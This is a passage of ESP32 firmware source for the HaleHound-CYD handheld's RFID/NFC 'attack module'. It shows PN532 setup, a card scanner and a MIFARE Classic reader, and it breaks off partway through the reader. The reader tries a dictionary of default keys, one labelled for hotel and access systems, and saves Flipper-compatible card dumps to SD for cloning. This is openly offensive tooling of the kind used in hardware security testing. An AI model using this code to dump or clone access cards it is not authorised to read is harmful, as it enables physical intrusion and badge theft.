// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD RFID/NFC Attack Module Implementation
// PN532 13.56 MHz — Scanner, Reader, Clone, Brute Force, Emulation
// Created: 2026-03-02
// ═══════════════════════════════════════════════════════════════════════════

#include "rfid_attacks.h"

#if CYD_HAS_PN532

#include <SPI.h>
#include <TFT_eSPI.h>
#include <Adafruit_PN532.h>
#include <Wire.h>
#include <SD.h>
#include "spi_manager.h"
#include "shared.h"
#include "touch_buttons.h"
#include "icon.h"
#include "utils.h"
#include "nosifer_font.h"

extern TFT_eSPI tft;

// ═══════════════════════════════════════════════════════════════════════════
// DEMO MODE — Set to 1 to test all screens WITHOUT physical PN532 hardware
// Fakes hardware init, populates screens with sample data so you can verify
// every UI element, button, and navigation path before hardware arrives.
// SET BACK TO 0 before shipping to your friend or using real hardware!
// ═══════════════════════════════════════════════════════════════════════════
#define RFID_DEMO_MODE 0

// Access PN532 library's internal packet buffer for SAK/ATQA extraction
// readPassiveTargetID() stores ATQA at [9-10] and SAK at [11]
extern byte pn532_packetbuffer[];

// ═══════════════════════════════════════════════════════════════════════════
// PN532 OBJECT — Software SPI (bit-banged) or I2C
// Hardware SPI LSBFIRST has known issues on ESP32 when sharing bus with
// MSBFIRST devices (NRF24/CC1101). Software SPI handles LSBFIRST reliably.
// Speed doesn't matter for RFID card reads — reliability does.
// I2C mode used on NM-CYD-C5 (no dedicated PN532_CS pin).
// ═══════════════════════════════════════════════════════════════════════════

#if defined(PN532_CS)
static Adafruit_PN532 nfc(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, PN532_CS);
#else
static Adafruit_PN532 nfc(-1, -1, &Wire);
#endif
static bool pn532_detected = false;
static uint8_t pn532_fw_major = 0;
static uint8_t pn532_fw_minor = 0;

// ═══════════════════════════════════════════════════════════════════════════
// MIFARE KEY DICTIONARY — known default keys for brute force and reading
// ═══════════════════════════════════════════════════════════════════════════

static const uint8_t NUM_DEFAULT_KEYS = 8;
static const uint8_t defaultKeys[NUM_DEFAULT_KEYS][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Factory default
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},  // MAD key A
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},  // MAD key B
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},  // NFC Forum
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // Null key
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},  // NDEF key
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},  // Hotel/access systems
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},  // Common test key
};

// ═══════════════════════════════════════════════════════════════════════════
// CARD TYPE IDENTIFICATION
// ═══════════════════════════════════════════════════════════════════════════

static const char* getCardTypeName(uint8_t sak) {
    switch (sak) {
        case 0x08: return "MIFARE Classic 1K";
        case 0x18: return "MIFARE Classic 4K";
        case 0x09: return "MIFARE Mini";
        case 0x00: return "MIFARE Ultralight/NTAG";
        case 0x01: return "TNP3XXX";
        case 0x10: return "MIFARE Plus 2K";
        case 0x11: return "MIFARE Plus 4K";
        case 0x20: return "MIFARE Plus/DESFire";
        case 0x28: return "SmartMX/JCOP";
        case 0x38: return "SmartMX/JCOP";
        default:   return "Unknown";
    }
}

static bool isMifareClassic(uint8_t sak) {
    return (sak == 0x08 || sak == 0x18 || sak == 0x09);
}

static int getSectorCount(uint8_t sak) {
    switch (sak) {
        case 0x08: return 16;   // Classic 1K = 16 sectors
        case 0x18: return 40;   // Classic 4K = 40 sectors (32x4block + 8x16block)
        case 0x09: return 5;    // Mini = 5 sectors
        default:   return 0;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SAK/ATQA EXTRACTION — read from pn532_packetbuffer after readPassiveTargetID
// ═══════════════════════════════════════════════════════════════════════════
// After readPassiveTargetID(), the library leaves the InListPassiveTarget
// response in pn532_packetbuffer:
//   [9-10] = ATQA (SENS_RES), big-endian
//   [11]   = SAK (SEL_RES)
//   [12]   = UID length
//   [13+]  = UID bytes

static uint8_t getLastSAK() {
    return pn532_packetbuffer[11];
}

static uint16_t getLastATQA() {
    uint16_t atqa = pn532_packetbuffer[9];
    atqa <<= 8;
    atqa |= pn532_packetbuffer[10];
    return atqa;
}

// ═══════════════════════════════════════════════════════════════════════════
// UI HELPERS — Matching standard HaleHound visual style
// ═══════════════════════════════════════════════════════════════════════════

// HaleHound signature gradient: Cyan (0,207,255) → Hot Pink (255,28,82)
static uint16_t rfidGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// Gradient progress bar — per-column cyan→hotpink fill with rounded border
static void drawGradientBar(int x, int y, int w, int h, int fillW) {
    // Double border: violet outer, gunmetal inner
    tft.drawRoundRect(x - 2, y - 2, w + 4, h + 4, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(x - 1, y - 1, w + 2, h + 2, 2, HALEHOUND_GUNMETAL);
    // Dark purple unfilled background
    tft.fillRect(x, y, w, h, tft.color565(12, 4, 18));
    // Per-column gradient fill
    for (int px = 0; px < fillW && px < w; px++) {
        float ratio = (float)px / (float)w;
        uint16_t col = rfidGradientColor(ratio);
        tft.drawFastVLine(x + px, y, h, col);
    }
    // Bright white leading edge for "glow" effect
    if (fillW > 1 && fillW < w) {
        tft.drawFastVLine(x + fillW - 1, y, h, TFT_WHITE);
        tft.drawFastVLine(x + fillW, y, h, tft.color565(180, 120, 200));
    }
}

// Standard icon bar — matches ALL other HaleHound modules (GUNMETAL bg)
static void drawRFIDIconBar(const char* title) {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.setTextSize(TEXT_SIZE_BODY);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
    tft.setCursor(30, ICON_BAR_Y + 2);
    tft.print(title);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Nosifer glitch title — 3-pass chromatic aberration (magenta/hotpink/white)
static void drawRFIDTitle(int y, const char* text) {
    drawGlitchText(y, text, &Nosifer_Regular10pt7b);
}

// Horizontal separator with gradient fade at edges
static void drawRFIDSeparator(int y) {
    for (int x = 5; x < SCREEN_WIDTH - 5; x++) {
        float edge = 1.0f;
        if (x < 20) edge = (float)(x - 5) / 15.0f;
        else if (x > SCREEN_WIDTH - 20) edge = (float)(SCREEN_WIDTH - 5 - x) / 15.0f;
        uint16_t col = rfidGradientColor(edge * 0.5f);
        tft.drawPixel(x, y, col);
    }
}

// Centered text helper
static void drawCenteredRFID(int y, const char* text, uint16_t color) {
    tft.setTextColor(color, TFT_BLACK);
    int textWidth = TEXT_CHAR_W * strlen(text);
    int textX = (SCREEN_WIDTH - textWidth) / 2;
    if (textX < 0) textX = 0;
    tft.setCursor(textX, y);
    tft.print(text);
}

static void drawHexByte(int x, int y, uint8_t val, uint16_t color) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y);
    tft.printf("%02X", val);
}

// Pulsing color — smooth sine oscillation between violet and hotpink
static uint16_t rfidPulseColor(unsigned long ms) {
    float t = (sinf(ms * 0.004f) + 1.0f) / 2.0f;
    return rfidGradientColor(t);
}

// Card detected flash — brief bright border pop
static void drawCardFlash() {
    for (int f = 0; f < 2; f++) {
        uint16_t col = (f == 0) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.drawRect(1, CONTENT_Y_START + 1, SCREEN_WIDTH - 2, SCREEN_HEIGHT - CONTENT_Y_START - 2, col);
        tft.drawRect(2, CONTENT_Y_START + 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - CONTENT_Y_START - 4, col);
    }
    delay(80);
    tft.drawRect(1, CONTENT_Y_START + 1, SCREEN_WIDTH - 2, SCREEN_HEIGHT - CONTENT_Y_START - 2, TFT_BLACK);
    tft.drawRect(2, CONTENT_Y_START + 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - CONTENT_Y_START - 4, TFT_BLACK);
}

// Scanning sweep line — animated bar across bottom
static void drawScanSweep(int frame) {
    int barY = SCREEN_HEIGHT - 6;
    int sweepX = (frame * 3) % (SCREEN_WIDTH + 40);
    // Clear old sweep
    tft.fillRect(0, barY, SCREEN_WIDTH, 4, TFT_BLACK);
    // Draw sweep with fading trail
    for (int i = 0; i < 40; i++) {
        int x = sweepX - i;
        if (x < 0 || x >= SCREEN_WIDTH) continue;
        float fade = 1.0f - (float)i / 40.0f;
        uint16_t col = rfidGradientColor(fade);
        tft.drawFastVLine(x, barY, 3, col);
    }
}

// Clear the full content area below the icon bar
static void clearContentArea() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, TFT_BLACK);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCROLL HELPERS — shared scrollable data list support
// ═══════════════════════════════════════════════════════════════════════════

#define SCROLL_BAR_H      16
#define SCROLL_BAR_Y      (SCREEN_HEIGHT - SCROLL_BAR_H)
#define SCROLL_ROW_H      13

static void drawScrollBar(int offset, int total, int visible) {
    tft.fillRect(0, SCROLL_BAR_Y, SCREEN_WIDTH, SCROLL_BAR_H, TFT_BLACK);

    if (total <= visible) {
        drawCenteredRFID(SCROLL_BAR_Y + 3, "BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    if (offset > 0) {
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(6, SCROLL_BAR_Y + 3);
        tft.print("[UP]");
    }

    char buf[16];
    int endIdx = offset + visible;
    if (endIdx > total) endIdx = total;
    snprintf(buf, sizeof(buf), "%d-%d / %d", offset + 1, endIdx, total);
    drawCenteredRFID(SCROLL_BAR_Y + 3, buf, HALEHOUND_GUNMETAL);

    if (offset + visible < total) {
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(SCREEN_WIDTH - 30, SCROLL_BAR_Y + 3);
        tft.print("[DN]");
    }
}

static bool handleScrollTouch(int& offset, int total, int visible) {
    if (total <= visible) return false;
    if (!isTouched()) return false;

    int tx = getTouchX();
    int ty = getTouchY();
    if (tx < 0 || ty < 0) return false;
    if (ty < SCROLL_BAR_Y - 4) return false;

    if (tx < SCREEN_WIDTH / 3 && offset > 0) {
        offset -= visible;
        if (offset < 0) offset = 0;
        waitForTouchRelease();
        return true;
    }

    if (tx > SCREEN_WIDTH * 2 / 3 && offset + visible < total) {
        offset += visible;
        if (offset > total - visible) offset = total - visible;
        if (offset < 0) offset = 0;
        waitForTouchRelease();
        return true;
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PN532 INIT / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

bool pn532Init() {
#if RFID_DEMO_MODE
    // Demo mode — fake successful init for UI testing without hardware
    pn532_fw_major = 1;
    pn532_fw_minor = 6;
    pn532_detected = true;
    Serial.println("[PN532] DEMO MODE — no hardware, UI testing only");
    return true;
#else
    #if defined(PN532_CS)
    Serial.println("[PN532] Starting init (software SPI)...");

    // Deselect all hardware SPI devices so their CS pins don't interfere
    spiDeselect();
    delay(10);

    // Manual PN532 wakeup — toggle CS to exit low-power mode
    // Software SPI constructor set PN532_CS as output already, but be safe
    pinMode(PN532_CS, OUTPUT);
    for (int i = 0; i < 3; i++) {
        digitalWrite(PN532_CS, LOW);
        delay(5);
        digitalWrite(PN532_CS, HIGH);
        delay(5);
    }
    delay(100);
    #elif defined(PN532_SDA) && defined(PN532_SCL)
    Serial.println("[PN532] Starting init (I2C)...");
    Wire.begin(PN532_SDA, PN532_SCL);
    #else
    Serial.println("[PN532] Starting init...");
    #endif

    // Library init — software SPI bit-bangs LSBFIRST correctly, no hardware quirks
    nfc.begin();
    delay(250);

    // Try getFirmwareVersion with retries
    uint32_t versionData = 0;
    for (int attempt = 0; attempt < 5; attempt++) {
        versionData = nfc.getFirmwareVersion();
        if (versionData) {
            Serial.printf("[PN532] Found on attempt %d\n", attempt + 1);
            break;
        }
        Serial.printf("[PN532] Attempt %d failed, retrying...\n", attempt + 1);
        // Re-wake and retry with increasing delays
        #ifdef PN532_CS
        digitalWrite(PN532_CS, LOW);
        delay(10);
        digitalWrite(PN532_CS, HIGH);
        #endif
        delay(100 + (attempt * 50));
    }

    if (!versionData) {
        Serial.println("[PN532] Not found after 5 attempts");
        #ifdef PN532_CS
        Serial.printf("[PN532] Pins: SCK=%d MOSI=%d MISO=%d CS=%d\n",
                      RADIO_SPI_SCK, RADIO_SPI_MOSI, RADIO_SPI_MISO, PN532_CS);
        Serial.println("[PN532] Check: DIP CH1=OFF CH2=ON, power cycle after DIP change");
        #elif defined(PN532_SDA) && defined(PN532_SCL)
        Serial.printf("[PN532] Pins: SDA=%d SCL=%d\n", PN532_SDA, PN532_SCL);
        #endif
        pn532_detected = false;
        return false;
    }

    pn532_fw_major = (versionData >> 16) & 0xFF;
    pn532_fw_minor = (versionData >> 8) & 0xFF;
    Serial.printf("[PN532] Found chip PN5%02X  FW: %d.%d\n",
                  (uint8_t)(versionData >> 24), pn532_fw_major, pn532_fw_minor);

    // Configure PN532 for reading cards
    nfc.SAMConfig();
    pn532_detected = true;
    return true;
#endif
}

void pn532Cleanup() {
    pn532_detected = false;

    #ifdef PN532_CS
    // Deselect PN532, release SPI bus
    spiDeselect();
    // Re-init hardware SPI for other radios (NRF24/CC1101)
    // Software SPI bit-banged GPIO 18/19/23 — need to reclaim for hardware SPI
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI);
    #endif
}

bool pn532IsPresent() {
    return pn532_detected;
}

// ═══════════════════════════════════════════════════════════════════════════
// RFID SCANNER — Detect and identify cards
// ═══════════════════════════════════════════════════════════════════════════

namespace RFIDScanner {

static bool exitRequested = false;
static bool scannerReady = false;

// Last detected card info
static uint8_t lastUid[7] = {0};
static uint8_t lastUidLen = 0;
static uint8_t lastSak = 0;
static uint16_t lastAtqa = 0;
static uint32_t cardCount = 0;
static bool cardPresent = false;
static unsigned long lastScanTime = 0;
static int scanFrame = 0;

// Y positions for Scanner layout
#define SCAN_TITLE_Y      55
#define SCAN_SEP_Y        68
#define SCAN_FW_Y         74
#define SCAN_STATUS_Y     88
#define SCAN_DATA_Y       104
#define SCAN_DATA_SPACING 16
#define SCAN_BOTTOM_Y     (SCREEN_HEIGHT - 18)

void setup() {
    exitRequested = false;
    scannerReady = false;
    cardCount = 0;
    cardPresent = false;
    scanFrame = 0;
    memset(lastUid, 0, sizeof(lastUid));
    lastUidLen = 0;
    lastSak = 0;
    lastAtqa = 0;

    tft.fillScreen(TFT_BLACK);
    drawRFIDIconBar("RFID Scanner");

    // Nosifer glitch title
    drawRFIDTitle(SCAN_TITLE_Y, "CARD SCANNER");
    drawRFIDSeparator(SCAN_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);
    drawCenteredRFID(SCAN_FW_Y, "Initializing PN532...", HALEHOUND_MAGENTA);

    if (!pn532Init()) {
        clearContentArea();
        drawRFIDTitle(SCAN_TITLE_Y, "CARD SCANNER");
        drawRFIDSeparator(SCAN_SEP_Y);

        int y = SCAN_FW_Y;
        drawCenteredRFID(y, "PN532 NOT FOUND!", HALEHOUND_HOTPINK);
        y += 18;
        drawCenteredRFID(y, "Check wiring:", HALEHOUND_MAGENTA);
        y += 16;
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(15, y); tft.print("SCK=18  MOSI=23  MISO=19");
        y += 14;
        tft.setCursor(15, y); tft.print("SS=17   VCC=3.3V  GND=GND");
        y += 14;
        tft.setCursor(15, y); tft.print("DIP: CH1=OFF  CH2=ON (SPI)");
        y += 22;
        drawCenteredRFID(y, "Tap BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    scannerReady = true;

    // Redraw with FW info
    clearContentArea();
    drawRFIDTitle(SCAN_TITLE_Y, "CARD SCANNER");
    drawRFIDSeparator(SCAN_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(10, SCAN_FW_Y);
    tft.printf("PN532 FW: %d.%d", pn532_fw_major, pn532_fw_minor);

    drawCenteredRFID(SCAN_STATUS_Y, "Hold card to reader...", HALEHOUND_MAGENTA);

    // Draw field labels with gradient coloring
    int y = SCAN_DATA_Y;
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(10, y);                         tft.print("UID:");
    tft.setCursor(10, y + SCAN_DATA_SPACING);     tft.print("SAK:");
    tft.setCursor(10, y + SCAN_DATA_SPACING * 2); tft.print("ATQA:");
    tft.setCursor(10, y + SCAN_DATA_SPACING * 3); tft.print("Type:");
    tft.setCursor(10, y + SCAN_DATA_SPACING * 4); tft.print("Cards:");

    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(10, SCAN_BOTTOM_Y);
    tft.print("Scanning...");
}

void loop() {
    if (!scannerReady || exitRequested) return;

    // Rate limit scans
    if (millis() - lastScanTime < 100) return;
    lastScanTime = millis();
    scanFrame++;

    // Animated sweep line while scanning
    if (!cardPresent) {
        drawScanSweep(scanFrame);
    }

    uint8_t uid[7] = {0};
    uint8_t uidLen = 0;
    bool success = false;

#if RFID_DEMO_MODE
    // Demo: simulate a card appearing after 2s, new card every 4s
    static unsigned long demoStart = 0;
    static uint8_t demoCardIdx = 0;
    if (demoStart == 0) demoStart = millis();

    unsigned long elapsed = millis() - demoStart;
    if (elapsed > 2000 && ((elapsed / 4000) != demoCardIdx || demoCardIdx == 0)) {
        demoCardIdx = elapsed / 4000;
        static const uint8_t demoUids[][4] = {
            {0xA1, 0xB2, 0xC3, 0xD4},
            {0xDE, 0xAD, 0xBE, 0xEF},
            {0x04, 0x7A, 0x9E, 0x22},
        };
        static const uint8_t demoSaks[] = {0x08, 0x18, 0x00};
        static const uint16_t demoAtqas[] = {0x0004, 0x0002, 0x0044};
        int idx = demoCardIdx % 3;
        memcpy(uid, demoUids[idx], 4);
        uidLen = 4;
        lastSak = demoSaks[idx];
        lastAtqa = demoAtqas[idx];
        success = true;
    }
#else
    success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100);
#endif

    if (success) {
        bool isNew = (uidLen != lastUidLen || memcmp(uid, lastUid, uidLen) != 0);

        if (isNew) {
            cardCount++;
            memcpy(lastUid, uid, uidLen);
            lastUidLen = uidLen;

            #if !RFID_DEMO_MODE
            lastSak = getLastSAK();
            lastAtqa = getLastATQA();
            #endif

            // Flash effect on new card
            drawCardFlash();

            // Clear card data area (values column only)
            int y = SCAN_DATA_Y;
            tft.fillRect(52, y, SCREEN_WIDTH - 57, SCAN_DATA_SPACING * 5, TFT_BLACK);

            // Clear the sweep line area
            tft.fillRect(0, SCREEN_HEIGHT - 6, SCREEN_WIDTH, 6, TFT_BLACK);

            // UID — bright hotpink
            tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
            tft.setCursor(52, y);
            for (uint8_t i = 0; i < uidLen; i++) {
                tft.printf("%02X", uid[i]);
                if (i < uidLen - 1) tft.print(":");
            }

            // SAK
            tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
            tft.setCursor(52, y + SCAN_DATA_SPACING);
            tft.printf("0x%02X          ", lastSak);

            // ATQA
            tft.setCursor(52, y + SCAN_DATA_SPACING * 2);
            tft.printf("0x%04X        ", lastAtqa);

            // Card type — bright white
            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
            tft.setCursor(52, y + SCAN_DATA_SPACING * 3);
            char typeBuf[24];
            snprintf(typeBuf, sizeof(typeBuf), "%-22s", getCardTypeName(lastSak));
            tft.print(typeBuf);

            // Card count with gradient color based on count
            float countRatio = (float)(cardCount % 10) / 10.0f;
            tft.setTextColor(rfidGradientColor(countRatio), TFT_BLACK);
            tft.setCursor(52, y + SCAN_DATA_SPACING * 4);
            tft.printf("%d    ", cardCount);

            // Update status line
            tft.fillRect(0, SCAN_BOTTOM_Y, SCREEN_WIDTH, 14, TFT_BLACK);
            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.setCursor(10, SCAN_BOTTOM_Y);
            tft.print("Card detected!");

            Serial.printf("[RFID] Card: UID=");
            for (uint8_t i = 0; i < uidLen; i++) Serial.printf("%02X", uid[i]);
            Serial.printf(" SAK=0x%02X ATQA=0x%04X %s\n", lastSak, lastAtqa, getCardTypeName(lastSak));
        }
        cardPresent = true;
    } else {
        if (cardPresent) {
            // Card was removed — resume sweep animation
            tft.fillRect(0, SCAN_BOTTOM_Y, SCREEN_WIDTH, 14, TFT_BLACK);
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setCursor(10, SCAN_BOTTOM_Y);
            tft.print("Scanning...");
            cardPresent = false;
        }
    }
}

void cleanup() {
    pn532Cleanup();
    scannerReady = false;
    exitRequested = false;
}

bool isExitRequested() {
    return exitRequested;
}

} // namespace RFIDScanner

// ═══════════════════════════════════════════════════════════════════════════
// RFID READER — Read all sectors and dump
// ═══════════════════════════════════════════════════════════════════════════

namespace RFIDReader {

static bool exitRequested = false;

// Reader state machine
enum ReaderState {
    READER_WAIT_CARD,
    READER_READING,
    READER_DISPLAY,
    READER_DONE
};

static ReaderState state = READER_WAIT_CARD;
static uint8_t cardUid[7] = {0};
static uint8_t cardUidLen = 0;
static uint8_t cardSak = 0;
static int totalSectors = 0;
static int currentSector = 0;
static int readOkCount = 0;
static int readFailCount = 0;

// Sector data storage: Classic 1K = 16 sectors x 4 blocks x 16 bytes = 1024 bytes
// Classic 4K would be bigger but we cap at 1K for RAM safety
#define MAX_SECTORS   16
#define BLOCKS_PER_SECTOR 4
#define BYTES_PER_BLOCK   16
static uint8_t sectorData[MAX_SECTORS][BLOCKS_PER_SECTOR][BYTES_PER_BLOCK];
static bool sectorReadOk[MAX_SECTORS];
static uint8_t sectorKeyUsed[MAX_SECTORS]; // which key index worked

// Display scroll state
static int displayOffset = 0;

static bool authenticateAndReadSector(int sector) {
    uint8_t keyBuf[6];
    // First block of sector
    int firstBlock = sector * BLOCKS_PER_SECTOR;

    // Try each default key
    for (uint8_t k = 0; k < NUM_DEFAULT_KEYS; k++) {
        memcpy(keyBuf, defaultKeys[k], 6);

        // Try Key A authentication
        if (nfc.mifareclassic_AuthenticateBlock(cardUid, cardUidLen, firstBlock, 0, keyBuf)) {
            // Key A worked — read all 4 blocks in this sector
            bool allOk = true;
            for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
                if (!nfc.mifareclassic_ReadDataBlock(firstBlock + b, sectorData[sector][b])) {
                    allOk = false;
                    memset(sectorData[sector][b], 0, BYTES_PER_BLOCK);
                }
            }
            sectorKeyUsed[sector] = k;
            return allOk;
        }

        // Try Key B authentication
        if (nfc.mifareclassic_AuthenticateBlock(cardUid, cardUidLen, firstBlock, 1, keyBuf)) {
            bool allOk = true;
            for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
                if (!nfc.mifareclassic_ReadDataBlock(firstBlock + b, sectorData[sector][b])) {
                    allOk = false;
                    memset(sectorData[sector][b], 0, BYTES_PER_BLOCK);
                }
            }
            sectorKeyUsed[sector] = k;
            return allOk;
        }
    }

    return false;
}

static void saveDumpToSD() {
    spiDeselect();
    delay(10);

    if (!spiSelectSD()) return;

    // Create /rfid/ directory if needed
    bool sdOk = SD.begin(SD_CS);
    if (!sdOk) {
        SPI.begin(18, 19, 23, SD_CS);
        sdOk = SD.begin(SD_CS, SPI, 4000000);
    }
    if (!sdOk) return;
    if (!SD.exists("/rfid")) {
        SD.mkdir("/rfid");
    }

    // Filename: DUMP_<UID>.txt
    char filename[40];
    snprintf(filename, sizeof(filename), "/rfid/DUMP_");
    int pos = strlen(filename);
    for (int i = 0; i < cardUidLen; i++) {
        pos += snprintf(filename + pos, sizeof(filename) - pos, "%02X", cardUid[i]);
    }
    snprintf(filename + pos, sizeof(filename) - pos, ".txt");

    File f = SD.open(filename, FILE_WRITE);
    if (!f) {
        Serial.printf("[RFID] Failed to open %s\n", filename);
        spiDeselect();
        return;
    }

    // Flipper-compatible format header
    f.println("Filetype: Flipper NFC device");
    f.println("Version: 4");
    f.println("Device type: MIFARE Classic");
    f.printf("UID: ");
    for (int i = 0; i < cardUidLen; i++) {
        if (i > 0) f.print(" ");
        f.printf("%02X", cardUid[i]);
    }
    f.println();
    f.printf("SAK: %02X\n", cardSak);
    f.println();

    // Dump all blocks
    for (int s = 0; s < totalSectors && s < MAX_SECTORS; s++) {
        for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
            int blockNum = s * BLOCKS_PER_SECTOR + b;
            f.printf("Block %d:", blockNum);
            for (int i = 0; i < BYTES_PER_BLOCK; i++) {
                f.printf(" %02X", sectorData[s][b][i]);
            }
            f.println();
        }
    }

    f.close();
    SD.end();
    spiDeselect();

    Serial.printf("[RFID] Dump saved to %s\n", filename);

    // Show save confirmation on screen
    tft.fillRect(10, SCREEN_HEIGHT - 18, SCREEN_WIDTH - 20, 12, TFT_BLACK);
    tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
    tft.setCursor(10, SCREEN_HEIGHT - 18);
    tft.print("Saved to SD!");

    // Re-init PN532 after SD used the bus
    delay(50);
    pn532Init();
}

// Y positions for Reader layout
#define RDR_TITLE_Y      55
#define RDR_SEP_Y        68
#define RDR_INFO_Y       76
#define RDR_BAR_Y        106
#define RDR_BAR_H        12
#define RDR_STATUS_Y     124
#define RDR_DUMP_TITLE_Y 142
#define RDR_DUMP_DATA_Y  156

static void drawReaderPage() {
    int maxVisible = (SCROLL_BAR_Y - RDR_DUMP_DATA_Y) / SCROLL_ROW_H;
    tft.fillRect(0, RDR_DUMP_DATA_Y, SCREEN_WIDTH, SCROLL_BAR_Y - RDR_DUMP_DATA_Y, TFT_BLACK);
    tft.setTextSize(TEXT_SIZE_BODY);
    int ry = RDR_DUMP_DATA_Y;
    for (int i = 0; i < maxVisible && (displayOffset + i) < totalSectors; i++) {
        int s = displayOffset + i;
        tft.setTextColor(sectorReadOk[s] ? rfidGradientColor((float)s / totalSectors) : HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(2, ry);
        tft.printf("S%02d:", s);
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(28, ry);
        for (int j = 0; j < 8; j++) {
            tft.printf("%02X", sectorData[s][0][j]);
        }
        tft.setTextColor(tft.color565(40, 40, 60), TFT_BLACK);
        tft.print("..");
        ry += SCROLL_ROW_H;
    }
    drawScrollBar(displayOffset, totalSectors, maxVisible);
}

void setup() {
    exitRequested = false;
    state = READER_WAIT_CARD;
    currentSector = 0;
    readOkCount = 0;
    readFailCount = 0;
    displayOffset = 0;
    memset(sectorData, 0, sizeof(sectorData));
    memset(sectorReadOk, 0, sizeof(sectorReadOk));
    memset(sectorKeyUsed, 0xFF, sizeof(sectorKeyUsed));

    tft.fillScreen(TFT_BLACK);
    drawRFIDIconBar("Card Reader");
    drawRFIDTitle(RDR_TITLE_Y, "CARD READER");
    drawRFIDSeparator(RDR_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);

    if (!pn532Init()) {
        drawCenteredRFID(RDR_INFO_Y, "PN532 NOT FOUND!", HALEHOUND_HOTPINK);
        drawCenteredRFID(RDR_INFO_Y + 18, "Check wiring & retry", HALEHOUND_GUNMETAL);
        drawCenteredRFID(RDR_INFO_Y + 36, "Tap BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    drawCenteredRFID(RDR_INFO_Y + 6, "Hold MIFARE card to reader", HALEHOUND_MAGENTA);
    drawCenteredRFID(RDR_INFO_Y + 22, "to read all sectors", HALEHOUND_GUNMETAL);
}

void loop() {
    if (exitRequested) return;

    switch (state) {
        case READER_WAIT_CARD: {
            uint8_t uid[7] = {0};
            uint8_t uidLen = 0;
            bool detected = false;
#if RFID_DEMO_MODE
            static unsigned long readerDemoStart = 0;
            if (readerDemoStart == 0) readerDemoStart = millis();
            if (millis() - readerDemoStart > 2000) {
                uid[0] = 0xA1; uid[1] = 0xB2; uid[2] = 0xC3; uid[3] = 0xD4;
                uidLen = 4;
                detected = true;
                readerDemoStart = 0;
            }
#else
            detected = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100);
#endif
            if (detected) {
                memcpy(cardUid, uid, uidLen);
                cardUidLen = uidLen;
#if RFID_DEMO_MODE
                cardSak = 0x08;
#else
                cardSak = getLastSAK();
#endif
                if (!isMifareClassic(cardSak)) {
                    clearContentArea();
                    drawRFIDTitle(RDR_TITLE_Y, "CARD READER");
                    drawRFIDSeparator(RDR_SEP_Y);
                    drawCenteredRFID(RDR_INFO_Y, "Not a MIFARE Classic!", HALEHOUND_HOTPINK);
                    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
                    tft.setCursor(10, RDR_INFO_Y + 18);
                    tft.printf("SAK: 0x%02X  %s", cardSak, getCardTypeName(cardSak));
